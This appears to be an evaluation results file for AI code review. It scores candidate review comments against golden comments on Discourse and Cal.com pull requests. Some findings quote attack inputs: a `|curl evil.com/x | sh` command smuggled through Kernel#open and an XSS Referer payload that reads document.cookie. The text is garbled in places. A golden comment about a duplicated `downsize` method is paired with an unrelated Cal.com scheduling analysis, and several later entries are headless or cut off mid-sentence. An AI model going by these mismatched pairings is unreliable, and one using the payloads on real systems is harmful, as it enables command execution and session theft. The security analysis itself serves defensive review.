true_positives.golden_comment: BlockedEmail.should_block_email? method has side effects during a read operation - it updates statistics even when just checking if an email should be blocked. This could cause race conditions in concurrent environments and makes the method name misleading.
true_positives.matched_candidate:
Non-atomic read-modify-write of match_count loses increments and writes during validation

`should_block?` loads the record, does `record.match_count += 1` in Ruby and then `record.save`. Two concurrent signups using the same blocked address read the same `match_count` and both write the same incremented value, so increments are silently lost. It also issues an UPDATE of the whole row (including `updated_at`) from inside a read-only predicate. Use an atomic SQL update (e.g. `BlockedEmail.where(id: record.id).update_all("match_count = match_count + 1, last_match_at = ...")` or `increment!`) so the statistic is correct under concurrency.
true_positives.reasoning: Both comments identify the same bug: should_block? performs a side-effecting statistic update during a read/predicate, creating race conditions under concurrency. The candidate adds specifics about lost increments and atomic updates, but the underlying issue is the same.

true_positives.golden_comment: The case-sensitive email lookup in `BlockedEmail.should_block?` creates a bypass risk, allowing 'User@Example.com' to bypass a block on 'user@example.com'. This can lead to unauthorized access to blocked users.
true_positives.matched_candidate:
Blocked-email lookup is exact/case-sensitive, so the block is trivially bypassed

`BlockedEmail.where(email: email).first` performs an exact string comparison. Nothing in this model (or in `User.new_from_params`, which assigns `params[:email]` verbatim) normalizes case or strips whitespace, and the unique index added in the migration is on the raw column. An admin blocking `spammer@example.com` will not block a signup with `Spammer@Example.com`, and blocking `Spammer@Example.com` will not block the lowercase form. Downcase/strip the email both when persisting a BlockedEmail and when looking it up (consistent with `Email.downcase` used elsewhere).
true_positives.reasoning: Both identify the same bypass: BlockedEmail lookup is exact/case-sensitive, so an email with different casing can evade a block. The candidate adds whitespace normalization, but the core bug is the same.

false_positives.candidate:
Validator performs a database write, so match statistics are double counted and can be rolled back

`BlockedEmail.should_block?` mutates and saves the BlockedEmail row, and it is invoked from `validate_each`. `UsersController#create` calls `user.valid?` (for the Discourse Hub check) and then `user.save`, so validation runs twice for a single signup attempt and `match_count` is incremented twice. Worse, the increment that happens during `save` runs inside the user's save transaction, so it is rolled back if the insert fails, while the increment from the earlier `valid?` persists — making the counter and `last_match_at` unreliable. Move the side effect out of validation (e.g. record the match in the controller/flow after the check) or make the counter update happen outside the AR transaction.

rejectedEmails array is declared on the class and shared/never reset

`rejectedEmails: Em.A([])` puts a single mutable array on the controller's prototype, so every instance of `CreateAccountController` shares the same array object and `pushObject` mutates shared state. In addition the list is never cleared, so an email rejected once stays flagged as invalid for the lifetime of the page even if the server-side reason no longer applies (e.g. the whitelist setting changed, or the user corrects an unrelated field and retries). Initialize it per-instance (in `init`) and clear it when the modal is opened.

Any email error from the server is reported to the user as "invalid"

Every server-side email error (already-taken address, domain whitelist/blacklist rejection, blocked email) causes the email to be pushed into `rejectedEmails`, and `emailValidation` then renders the generic `user.email.invalid` reason. The actual server message (which is only shown transiently in the flash) is discarded, so users retyping the form see a misleading "invalid email" message for reasons such as "email already registered". Consider storing the server reason alongside the rejected email and displaying it.

No coverage for the whitelist/blacklist logic moved out of User, nor for the model wiring

The whitelist/blacklist validation was moved from `User#email_validator` into this new `EmailValidator`, but the only specs added stub `BlockedEmail.should_block?` and exercise the blocked branch. There is no test for `email_domains_whitelist`/`email_domains_blacklist` behaviour in its new home, no test that an existing error on `:email` short-circuits the blocked check (the `record.errors[attribute].blank?` guard), and no test that `User` actually rejects a blocked email end-to-end via `validates :email, email: true`. A regression in the moved code or in the model wiring would go unnoticed.

false_negatives.golden_comment: The regex pattern @(#{domains}) in email_in_restriction_setting? method only matches domain suffixes, not full domains with proper boundary anchoring. An attacker can register evil.example.com to bypass a whitelist entry for example.com.

true_positives.golden_comment: Mixing float: left with flexbox causes layout issues. Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.
true_positives.matched_candidate:
.panel loses right alignment on the legacy box model the flexbox mixin targets

`.panel` replaced `float: right` with `margin-left: auto` + `order(3)`. `margin-left: auto` only pushes a flex item to the end in the modern flexbox spec; the `flexbox()` mixin deliberately also emits `display: -webkit-box` and `display: -moz-box` for old WebKit/Gecko, where auto margins are not honoured in the box model. In those browsers the header panel (notification/search/user icons) will now render left-aligned right after the title instead of at the right edge. Either drop the legacy `display` fallbacks or add `-webkit-box-pack: end` / `-ms-flex-pack: end` on `.contents`.
true_positives.reasoning: Both comments identify the same regression: replacing the panel's float-based right alignment causes it to lose right alignment in the affected header layout. The candidate's legacy-flexbox explanation is a narrower framing, but it points to the same bug.

true_positives.golden_comment: -ms-align-items never existed in any version of IE/Edge; the correct legacy property is -ms-flex-align.
true_positives.matched_candidate:
align-items mixin passes modern values straight to legacy properties and omits -moz-box-align

`align-items($alignment)` forwards the value verbatim to `-webkit-box-align` and `-ms-flex-align`, but those legacy properties only accept `start | center | end | baseline | stretch`. Any future call with the spec values `flex-start`, `flex-end`, `space-between`, etc. will emit invalid declarations that old browsers drop silently, so the legacy prefixes give a false sense of coverage (and the invalid value is easy to miss because the standard `align-items` still works). The mixin also never emits `-moz-box-align`, even though `flexbox()` emits `display: -moz-box`, so legacy Gecko gets box layout with no alignment. Finally, `-ms-align-items` (line 121) is not a real property in any browser and is dead output. Consider mapping values (e.g. `flex-start` -> `start`) or dropping the legacy prefixes entirely.
true_positives.reasoning: The candidate explicitly flags that -ms-align-items is not a real property in any browser and is dead output, matching the golden comment's core issue. Additional points about value mapping and -moz-box-align do not change the shared bug identification.

true_positives.golden_comment: -webkit-box-ordinal-group and -moz-box-ordinal-group require values starting from 1, not 0. If $val is 0, this will cause incorrect rendering in older browsers, leading to layout issues.
true_positives.matched_candidate:
order mixin maps directly onto 1-based box-ordinal-group

`order($val)` emits `-webkit-box-ordinal-group`/`-moz-box-ordinal-group` with the same number as `order`. The legacy ordinal-group property is 1-based (minimum value 1, default 1) while `order` is 0-based with default 0, so any call with `order(0)` or a negative value (both legal for `order`) produces an invalid legacy declaration, and relative ordering between items that set `order` and items that do not can differ between the legacy and modern code paths. If the legacy prefixes are kept, the value should be offset/validated; otherwise they should be dropped.
true_positives.reasoning: The candidate identifies the same bug: order() emits legacy -webkit/-moz box-ordinal-group values directly, but those properties are 1-based while order is 0-based, so order(0) (and negatives) produce invalid legacy declarations and ordering mismatches.

false_positives.candidate:
`float: right` on .small-action button is inert now that .small-action is a flex container

`.small-action` now gets `@include flexbox()` (display:flex), which makes float declarations on its direct children no-ops. The `button` child still relies on `float: right` to be pushed to the right edge of the small-action row (e.g. the undo/delete control). With flex layout the button becomes a normal flex item sized to its content and will sit immediately after `.small-action-desc` instead of at the right edge of the row. To keep the previous layout the button needs `margin-left: auto` (or the description needs `flex: 1`). The same applies to `float: left` on `.topic-avatar` (line 270), which is now dead code.

Removing vertical padding from .small-action-desc can let the floated avatar overflow

`.small-action-desc` changed from `padding: 0.5em 0 0.5em 4em; margin-top: 5px` to `padding: 0 1.5%`, but `.small-action-desc .avatar` (line 298) is still floated. A float does not contribute to the height of its block container, so with zero vertical padding the flex item's height is only the text line height; if the avatar is taller than one line of the 0.9em text it will overflow the flex item and overlap neighbouring content. Previously the 0.5em padding plus 5px margin absorbed the difference. Consider clearing the float or using flex/inline-block for the avatar instead.

inline-flex mixin forces legacy box layout where a safe inline-block fallback existed

`.badge-wrapper.bullet` previously declared only `display: inline-flex`, so browsers without flexbox support simply kept `display: inline-block` from the `.badge-wrapper` rule and rendered correctly. The new `inline-flex()` mixin additionally emits `display: -webkit-inline-box` / `-moz-inline-box` / `-ms-inline-flexbox`, which those same old browsers *do* understand, switching the bullet badges to the legacy box model with different sizing/shrinking rules (relevant here because `span.badge-category` relies on `max-width`, `overflow: hidden` and `text-overflow: ellipsis`). This is a rendering change for old browsers that was previously handled gracefully; verify it or drop the legacy display fallbacks.

true_positives.golden_comment: The include_website_name method is missing the required ? suffix. Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.
true_positives.matched_candidate:
include_website_name is missing the trailing '?' so the inclusion guard is dead code

ActiveModel::Serializers looks for a predicate named `include_<attribute>?`. The method defined here is `include_website_name` (no question mark), so it is never called and `website_name` is always emitted — including as `null` for every user without a website. Rename it to `include_website_name?` (and note that its body should also honour `scope.restrict_user_fields?`, see the untrusted-attributes issue).
true_positives.reasoning: The candidate correctly identifies the core issue: include_website_name lacks the trailing '?' that ActiveModel::Serializers requires for conditional inclusion, so the attribute is never conditionally omitted. The golden comment's secondary note about string concatenation is not mentioned, but the primary bug matches.

false_positives.candidate:
website_name is not listed in untrusted_attributes, leaking TL0 users' website to anonymous visitors

`:website` is included in `untrusted_attributes` (line 105-111) so that a trust-level-0 user's website is hidden from anonymous viewers (anti-spam/SEO measure). The new `:website_name` attribute is added to the plain `attributes` list only, so it is always serialized and now exposes the host (and, for same-domain sites, the full path) of a TL0 user's website to anonymous requests. The front-end template renders `model.website_name` unconditionally, so the previously suppressed information becomes visible again. `:website_name` should be added to `untrusted_attributes` (and the TL0 spec list updated).

`"." << website_host` mutates a string literal

`discourse_host.ends_with?("." << website_host)` uses destructive append on a string literal. It works today only because literals are unfrozen; under `# frozen_string_literal: true` (or if the file is ever frozen-string-literal enabled) this raises `FrozenError` at runtime for every profile serialization. Use `".#{website_host}"` or `"." + website_host`.

Sibling-subdomain comparison yields false positives on shared public suffixes

The branch that strips the first label (`www.example.com` vs `forum.example.com`) compares only the remaining labels, so unrelated sites that merely share a public suffix of the same label count are treated as the same domain — e.g. instance `forum.github.io` and user website `someone.github.io`, or any pair under a 3-label suffix. The result is that the full URL path of an unrelated third-party site is rendered as the link text. Consider restricting this to a registrable-domain comparison (e.g. PublicSuffix) or at least matching only when one host is a suffix of the other.

Only URI path is appended; query/fragment are dropped and host matching is case sensitive

`website_name` builds the display text from `host + path`, so for `http://example.com/u?tab=1#x` on a same-domain instance it renders `example.com/u`, silently hiding the part of the URL the feature is meant to disclose. Additionally `URI#host` preserves the case as typed, so `http://Example.com` never equals `Discourse.current_hostname` (`example.com`) and falls into the generic branch. Downcase the host before comparing and include query/fragment (or use `URI#request_uri`) if the goal is to show the complete URL.

TL0/anonymous spec does not assert website_name is withheld

The `untrusted_attributes` list in the "TL0 user seen as anonymous" context was not updated with `website_name`, so the new attribute's exposure to anonymous viewers is untested and the regression described above passes CI. Add `website_name` to that list (after fixing the serializer) so the privacy guard is covered.

Missing cases for sibling-subdomain branch and blank/invalid website

The new specs cover only equal hosts, unrelated hosts, and website-domain-is-parent-of-instance. There is no coverage for the sibling-subdomain branch the code explicitly implements (e.g. instance `forum.example.com`, website `http://www.example.com/user`), for the reverse case (instance `example.com`, website `www.example.com`), or for a blank/unparseable website (which must return nil without raising and ideally omit the key). These are the branches most likely to break.

true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on a site-setting URL allows command execution and has no timeouts

`SimpleRSS.parse open(SiteSetting.feed_polling_url)` uses `Kernel#open` with open-uri semantics: a value beginning with `|` (e.g. `|curl evil.com/x | sh`) is executed as a shell command, so an admin-editable (and, in multisite setups, potentially less-trusted) site setting becomes remote command execution in the Sidekiq process. There is also no read/open timeout or size limit, so a slow or huge feed can hang the worker indefinitely. Validate the scheme (http/https only) and fetch with `URI.parse(...).open` / a real HTTP client with timeouts.
true_positives.reasoning: Both comments flag the same unsafe call: open(SiteSetting.feed_polling_url) with no validation. The candidate emphasizes pipe-based command execution and missing timeouts, while the golden comment emphasizes SSRF, but they concern the same unvalidated site-setting URL and the candidate's scheme validation/HTTP client fix addresses it.

true_positives.golden_comment: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.
true_positives.matched_candidate:
postMessage origin check uses substring matching instead of comparing origins

`if (discourseUrl.indexOf(e.origin) === -1) { return; }` accepts any `event.origin` that happens to be a substring of the configured `discourseUrl` (and would silently accept everything if `discourseUrl` were ever empty). Derive the expected origin from `discourseUrl` (scheme + host + optional port) and compare it with `e.origin` for strict equality, so only the forum frame can resize the iframe.
true_positives.reasoning: Both comments identify the same vulnerability: the postMessage origin check uses indexOf/substring matching, which can be bypassed by a malicious domain. The candidate recommends the same fix of deriving the expected origin and using strict equality.

true_positives.golden_comment: The TopicEmbed.import method is susceptible to a NoMethodError if the contents parameter is nil when attempting to append a string, and an XSS vulnerability due to unescaped url interpolation in the generated HTML.
true_positives.matched_candidate:
Unescaped request.referer interpolated into inline JavaScript (XSS)

The embed layout writes `parent.postMessage({...}, '<%= request.referer %>')`, injecting the raw `Referer` request header into a single-quoted JS string literal with no escaping (no `j`/`escape_javascript`, and ERB's HTML escaping does not help inside a JS string). The only validation performed is `EmbedController#ensure_embeddable`, which checks the *host* of the referer; the path, query and fragment are free-form and may legally contain `'`, so an attacker who can get a victim to load `embed/best` with a crafted Referer (e.g. `http://<embeddable_host>/#'+alert(document.cookie)+'`) gets script execution in the forum's origin. Escape with `escape_javascript` (or, better, compute and emit only the scheme+host origin).
true_positives.reasoning: The candidate identifies the same XSS vulnerability: unescaped referer/URL interpolation into generated JavaScript/HTML. It omits the separate nil-contents NoMethodError, but the core security issue matches.

true_positives.golden_comment: The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.
true_positives.matched_candidate:
`<%- end if %>` produces a stray modifier-if that breaks the header block

Line 6 emits the Ruby code `end if` instead of `end`. The compiled template therefore becomes `if ... else ... end if <next generated statement>`, i.e. the whole if/else expression turns into a modifier-if whose condition is the following generated line (the logo `link_to` append). Depending on the ERB compiler this either raises a syntax error when the template is compiled (500 on every embed request) or silently reorders the output so the logo is appended before the button. Change it to `<%- end %>`.
true_positives.reasoning: Both comments identify the same bug: the ERB block uses `end if` instead of a plain `end`, producing invalid Ruby/ERB that breaks template rendering. The candidate adds detail about the resulting modifier-if but points to the same fix.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
`i.content` is nil for RSS 2.0 feeds, raising NoMethodError and killing the job

`content = CGI.unescapeHTML(i.content.scrub)` assumes every feed item exposes a `content` field. SimpleRSS returns nil for keys that are absent, and RSS 2.0 items carry the body in `description` (Atom uses `content`/`summary`). For a plain RSS feed this raises `NoMethodError: undefined method 'scrub' for nil`. Because the job is declared `sidekiq_options retry: false`, the whole hourly poll aborts on the first such item and nothing is imported, with no fallback. Fall back to `i.description`/`i.summary` and skip items with blank content.
true_positives.reasoning: Both identify the same bug: i.content can be nil for RSS feeds, so calling scrub raises an error. Both recommend falling back to description (candidate also mentions summary) to avoid aborting.

true_positives.golden_comment: An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.
true_positives.matched_candidate:
Unescaped request.referer interpolated into inline JavaScript (XSS)

The embed layout writes `parent.postMessage({...}, '<%= request.referer %>')`, injecting the raw `Referer` request header into a single-quoted JS string literal with no escaping (no `j`/`escape_javascript`, and ERB's HTML escaping does not help inside a JS string). The only validation performed is `EmbedController#ensure_embeddable`, which checks the *host* of the referer; the path, query and fragment are free-form and may legally contain `'`, so an attacker who can get a victim to load `embed/best` with a crafted Referer (e.g. `http://<embeddable_host>/#'+alert(document.cookie)+'`) gets script execution in the forum's origin. Escape with `escape_javascript` (or, better, compute and emit only the scheme+host origin).
true_positives.reasoning: Both identify the same XSS vulnerability from interpolating an unescaped request.referer header into inline JavaScript.

false_positives.candidate:
Feed HTML stored as raw_html and rendered unescaped (stored XSS)

Feed item bodies are run through `CGI.unescapeHTML` (turning `<script>` back into real tags) and handed to `TopicEmbed.import`, which creates the post with `cook_method: Post.cook_methods[:raw_html]`. `Post#cook` then returns `raw` verbatim (app/models/post.rb:133) and the embed view renders it with `<%= raw post.cooked %>` (app/views/embed/best.html.erb:19), as does the normal topic view. No sanitization step exists anywhere in this path, so any script/iframe/onerror payload in a polled RSS/Atom feed (or in a compromised/hijacked feed URL) becomes stored XSS for every forum visitor. The raw HTML should be sanitized (e.g. via `Sanitize`/the existing allowed-tag whitelist) before being stored as `raw_html`.

Anonymous requests can trigger unbounded remote fetches and topic creation for arbitrary URLs

`best` enqueues `Jobs::RetrieveTopic` for any `embed_url` whose host matches `embeddable_host`, with no authentication required. `TopicRetriever` only throttles per exact URL (60s), so a client can iterate over arbitrary paths/query strings on the embeddable host (`?x=1`, `?x=2`, ...) and cause the forum to (a) create an unbounded number of redis throttle keys, (b) issue an unbounded number of outbound HTTP fetches, and (c) create a new topic/post per distinct URL, including for 404/garbage pages. A global rate limit (per IP and/or per site) and a check that the retrieved page is a real article are needed.

`post.present?` does not mean the post was saved; can violate NOT NULL on topic_embeds

`PostCreator#create` returns the (possibly unsaved) `@post` object even when validation fails — `save_post` raises `ActiveRecord::Rollback`, which inside this nested `Topic.transaction` block is swallowed rather than rolling back. `post.present?` is therefore true for an unsaved record, and `TopicEmbed.create!(topic_id: post.topic_id, post_id: post.id, ...)` runs with nil ids, violating the `null: false` constraints added in 20131217174004 and raising a StatementInvalid out of the job. Check `post.try(:persisted?)` / `creator.errors.blank?` instead.

New embed assets are not added to the asset precompile list

The layout references `stylesheet_link_tag 'embed'` and the new `app/assets/javascripts/embed.js` is meant to be served to third-party sites, but neither asset is added to `config.assets.precompile` (no change to config/application.rb or an initializer in this PR). Discourse precompiles an explicit whitelist, so in production `embed.css` / `embed.js` will not exist and every `embed/best` request will raise `Sprockets::Rails::Helper::AssetNotPrecompiled` / 500. Add both files to the precompile list.

`force: true` added to an already-committed migration can drop a populated table

This migration existed before the PR and has already run on deployed installs; adding `force: true` has no effect there, but it makes the migration destructive if it is ever re-run (e.g. after a `rake db:migrate:redo`, a rollback/re-apply, or a schema reload), because `create_table ... force: true` issues a `DROP TABLE top_topics` first and silently discards the existing rows. The same pattern is used for the new `topic_embeds` table (db/migrate/20131217174004_create_topic_embeds.rb:3). `force: true` should not be used in migrations.

import mutates the caller's `contents` string

`contents << "\n<hr>..."` appends the attribution footer in place, so the caller's string object is modified as a side effect (e.g. the `content` local in PollFeed, or anything a plugin/thor task passes in). If a frozen or shared string is passed the call raises `RuntimeError: can't modify frozen String`, and repeated calls with the same object accumulate footers. Use `contents = contents + "..."` / `+=`.

absolutize_urls mangles protocol-relative URLs and ignores path-relative ones

The check `href.start_with?('/')` also matches protocol-relative URLs such as `//cdn.example.com/x.png`; `sub(/^\/+/, '')` then strips both slashes producing `http://feedhost/cdn.example.com/x.png`, i.e. a broken link/image for every protocol-relative asset in a feed (very common for CDN-hosted images). Conversely, truly relative references (`images/x.png`, `../x`) are left untouched and will resolve against the Discourse host. Resolving with `URI.join(url, href)` handles all of these cases correctly.

setnx followed by a separate expire can leave a permanent throttle key

`$redis.setnx(key, "1")` and `$redis.expire(key, 60)` are two round trips; if the process dies (or redis fails) between them, the key is left with no TTL and `retrieved_recently?` returns true forever, permanently blocking retrieval of that embed URL for non-staff users. Use a single atomic `SET key 1 NX EX 60`.

Negative PollFeed specs pass vacuously

`feed_polling_enabled` defaults to false (config/site_settings.yml), so the "requires feed_polling_url" and "requires embed_by_username" examples would pass even if those two conditions were removed from `execute` — the first condition already short-circuits. Each example should stub the other settings to valid values so that only the condition under test is false. Note also that `poll_feed` itself (feed parsing, url fallback, content handling) has no test coverage at all.

"is 404 without an embed_url" does not exercise the missing-parameter path

`embeddable_host` defaults to `''`, so `ensure_embeddable` raises `Discourse::InvalidAccess` before the action (and thus before `params.require(:embed_url)`) ever runs. The example passes for the wrong reason and gives no coverage of the missing-parameter behaviour; it also asserts only `should_not be_success` rather than the claimed 404. Stub `embeddable_host` and a matching referer, then assert the actual status returned for a missing `embed_url`.

`open(url).read` relies on open-uri being loaded, but topic_embed.rb only requires nokogiri; the `require 'open-uri'` lives in app/jobs/scheduled/poll_feed.rb. When `import_remote` is reached via `Jobs::RetrieveTopic` -> `TopicRetriever` (neither of which loads poll_feed or open-uri), `open` is plain `Kernel#open` and an http URL fails with `Errno::ENOENT`. Add `require 'open-uri'` to this file (and prefer `URI.parse(url).open` so a `|command` string can never be executed).

Only the Rails 4 lockfile was regenerated for the new gems

`ruby-readability` and `simple-rss` are added unconditionally to the Gemfile, but only `Gemfile_rails4.lock` is updated. The Gemfile explicitly supports dual-booting (RAILS3 / RAILS_MASTER) with separate lockfiles, so booting in those modes will hit an out-of-sync lockfile and require a `bundle install` (or fail in deployment/frozen mode). Regenerate the other lockfiles as part of this change.

false_negatives.golden_comment: postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.

The code sets X-Frame-Options: ALLOWALL which completely disables clickjacking protection. The referer validation can be bypassed (referer headers are easily spoofed), and the fallback to empty string for nil referer masks validation failures.

true_positives.golden_comment: The downsize method is defined twice. The second definition, which expects a single dimensions string parameter, overrides the first, which expected separate max_width and max_height parameters. This makes the original method unreachable and breaks existing code that calls it with separate width and height arguments.
true_positives.matched_candidate:

`checkIfIsAvailable` rejects a slot if `workingHours.find(...)` locates *any* working-hours entry for the slot's weekday that does not contain the slot (`start < workingHour.startTime || end > workingHour.endTime` → `return false` for the slot). `WorkingHours` is a list, and a single user routinely has several entries for the same day: a split schedule (e.g. 09:00-12:00 and 13:00-17:00 UTC) yields two entries, and `getWorkingHours` additionally splits any schedule that crosses UTC midnight into two entries. With a 09:00-12:00 / 13:00-17:00 schedule, the 10:00 slot is inside the first entry but outside the second, so the second entry makes the function return `false` and the slot disappears. Because every user of a personal event is treated as a fixed host (`isFixed: !eventType.schedulingType`), this silently removes all slots for any user with a lunch break or a schedule spanning UTC midnight. The condition must be "no entry contains the slot" (`!workingHours.some(containsSlot)`), not "some entry does not contain the slot".

Date-override check rejects slots when a date has multiple override ranges

The `dateOverrides.find(...)` predicate returns `true` as soon as *one* override entry for the slot's date does not contain the slot, and the outer `if` then returns `false` (slot unavailable). Cal.com allows several time ranges for a single date override day, and `getUserAvailability` returns one `{start,end}` entry per range. With overrides 09:00-11:00 and 14:00-16:00 on the same date, a 09:30 slot is inside the first range but `slotEndTime.isBefore(14:00)` is true for the second range, so the slot is dropped; symmetrically the 14:30 slot is dropped by the first range. The net effect is that no slots at all are offered on days with more than one override range. The check must be "the slot is contained in none of the ranges for that date" rather than "some range does not contain the slot".

Override containment check ignores the slot end, allowing bookings that overrun the override window

Within the matched date override only two rejections exist: the slot ends before/at the override start, or the slot *start* is strictly after the override end. A slot that starts inside the override but finishes after it is therefore accepted: with an override of 09:00-11:00 and a 60-minute event, the 10:30 slot (ending 11:30) is reported as available. Likewise a slot starting exactly at the override end (11:00) passes because `isAfter` is not inclusive. For round-robin events this re-introduces the problem the PR fixes — the fixed host gets booked outside their date override. The condition should require `slotEndTime` to be ≤ override end (and use `isSameOrAfter` for the start comparison).

Override date comparison mixes server-local and UTC formatting

`dayjs(date.start).add(utcOffset, "minutes").format("YYYY MM DD")` builds a dayjs in the *server's local* timezone, while `slotStartTime.format("YYYY MM DD")` is UTC (`slotStartTime = time.utc()`). On any deployment whose process timezone is not UTC the two date strings disagree near midnight, so `dateOverrideExist` is not set for the correct day: overrides are silently ignored (host booked when unavailable) or applied to the wrong day (all slots of a normal day dropped). Use `dayjs.utc(date.start)` so both sides are evaluated in the same zone.

`startTime`/`endTime` are derived as `hour()*60 + minute()` after shifting the override by `inviteeUtcOffset - organizerUtcOffset`, and are then applied relative to `startOfInviteeDay`. When the shift pushes the override past midnight the minute-of-day silently wraps and the override is applied to the wrong date. Example: organizer in UTC with an override 22:00-23:30 on day D, invitee in Asia/Kolkata (offset +330). The shifted time is 03:30-05:00 on D+1, giving startTime=210, which is added to the invitee's start of day D (18:30 UTC on D-1) producing slots at 22:00 UTC on D-1 — a full day earlier than the real override. In the opposite direction (negative offset crossing back over midnight) the wrap can make `endTime < startTime`, in which case `buildSlots` drops the range (`if (start >= end) continue;`) and the override produces no slots at all.

`dayjs(override.start.toString()).tz(override.timeZone)` relies on the new optional `timeZone` field added to `TimeRange` in packages/types/schedule.d.ts. When a caller of `getSlots` passes date overrides without `timeZone` (the field is `timeZone?: string`), `.tz(undefined)` falls back to dayjs' default/guessed timezone (the machine's zone), so `organizerUtcOffset` is computed from an unrelated zone and the override is shifted by an arbitrary amount instead of keeping the previous UTC interpretation. `checkIfIsAvailable` is invoked once per candidate slot per host (hundreds to thousands of times per `getSchedule` call on this public endpoint). For every invocation and every date override it calls `dayjs.tz(date.start, organizerTimeZone).utcOffset()` (Intl-backed, comparatively slow) and constructs ~5 additional dayjs objects, even though `utcOffset` and the converted override start/end are independent of the slot being tested. deleteMany `retryCount > 1` arm is not scoped to SMS reminders

false_positives.candidate:
retryCount update inside catch can abort the whole cron run

The `prisma.workflowReminder.update()` added at the top of the `catch` block is not itself protected. Before this change the catch only called `console.log`, so any error for one reminder was swallowed and the loop continued. Now, if this update throws (row deleted concurrently by the `deleteMany` of a parallel invocation → Prisma P2025 "record not found", or a DB connection error, which is exactly the kind of failure likely to have caused the original exception), the rejection propagates out of the `for` loop, every remaining unscheduled reminder in the batch is skipped, and the endpoint returns a 500 instead of the expected response. Wrap the update in its own try/catch (or `.catch()`) so a bookkeeping failure cannot abort the batch.

Transient failures cause permanent deletion of pending SMS reminders

`retryCount` is incremented for every failure path without distinguishing permanent errors (invalid phone number, which is the motivating case) from transient ones (Twilio outage/5xx, network timeout, DB hiccup, rate limiting). Since the cron processes all reminders due within the next 7 days on every run, two consecutive bad runs are enough to push `retryCount` to 2 for the entire backlog, and the next run's `deleteMany` silently deletes all of them — reminders that would have sent fine are lost permanently with no notification. Consider only counting non-retryable Twilio errors, or using a time-based backoff/last-attempt timestamp so retries are spread out rather than consumed within minutes/hours of each other.

No retry accounting when message is empty or sendTo is missing

The retryCount increment only happens inside `if (message?.length && message?.length > 0 && sendTo)`. When `sendTo` is null (e.g. `booking.smsReminderNumber` not set for an SMS_ATTENDEE step) or the rendered `message` is empty, the loop body falls through without touching the row: `scheduled` stays `false` and `retryCount` stays unchanged, so this reminder is re-selected and re-processed (including the `prisma.profile.findFirst` and `getBookerBaseUrl` queries) on every cron invocation until `scheduledDate` passes. That is precisely the endless-rescheduling behaviour this PR is meant to eliminate, and it remains unfixed for these cases.

OR on unindexed retryCount forces a full scan of WorkflowReminder on every cron run

The rewritten `deleteMany` produces `WHERE (method = 'SMS' AND scheduledDate <= now) OR retryCount > 1`. There is no index on `retryCount` (the schema only has `[method, scheduled, scheduledDate]` and `[cancelled, scheduledDate]`), so the OR prevents an index-only plan and Postgres will sequentially scan the whole `WorkflowReminder` table each time this cron runs. On a table of this size (one row per reminder per booking) that is a noticeable repeated cost. Splitting into two `deleteMany` calls (one per condition, with the retry one scoped to `method: SMS`) and/or indexing the retry predicate would keep the existing index usable.

The comment `//delete all scheduled sms reminders where scheduled date is past current date` now sits above a query that also deletes any reminder (of any method) whose `retryCount` exceeds 1. A reader relying on the comment will not realise rows are being removed for retry exhaustion, which is the main new behaviour here. Update the comment to mention the retry-count deletion.

The PR introduces behaviour that permanently deletes user-facing reminders (increment on failure, delete when `retryCount > 1`) and no test covers it: there is no assertion that a failed `twilio.scheduleSMS` increments `retryCount`, that a falsy (non-throwing) return also increments it, that a successful schedule leaves the row intact, or that the delete threshold yields exactly two attempts. Given the data-loss consequence of an off-by-one here (threshold `gt: 1` vs `gte: 1`), a unit test around the handler with a mocked twilio provider would be worth adding.

false_positives.candidate:
Returned SQL fragments contain top-level OR without enclosing parentheses

`getBaseConditions()` returns the authorization fragment verbatim when no filters are set (line 75), and for `org`/`team` scope that fragment is built by the reduce as `(A AND "isTeamBooking" = true) OR (B AND "isTeamBooking" = false)` with no enclosing parentheses (lines 171-174 and 204-207). The same is true for `getFilterConditions()` when only `eventTypeId` is set (`("eventTypeId" = x) OR ("eventParentId" = x)`). Because `AND` binds tighter than `OR` in SQL, any consumer that composes the fragment with extra predicates — e.g. `WHERE ${baseConditions} AND "startTime" >= ${from}` — produces `A OR (B AND startTime >= ...)`, so the additional predicate constrains only one branch of the OR. The result is silently widened row sets, i.e. a potential authorization/scope bypass and wrong insights numbers. The fragments should be wrapped (`Prisma.sql`(${cond})`) before being returned. Note the only test uses `WHERE ${baseConditions}` standalone, so this failure mode is not covered.

The public method `findMany(findManyArgs: Prisma.BookingTimeStatusDenormalizedFindManyArgs)`, which ran `prisma.bookingTimeStatusDenormalized.findMany` with the authorization and filter where-clauses applied, is deleted and replaced by `getBaseConditions()` returning a raw `Prisma.Sql`. Either keep a `findMany`-style convenience wrapper or update the call sites in this PR. The PR description also states that only the tests changed and that the service was already converted, which hides this breaking change from reviewers.

The previous typing made this a compile error. Keep the discriminated union as the constructor type (or at least log/throw when validation fails) so misuse is caught instead of producing silently empty insights.

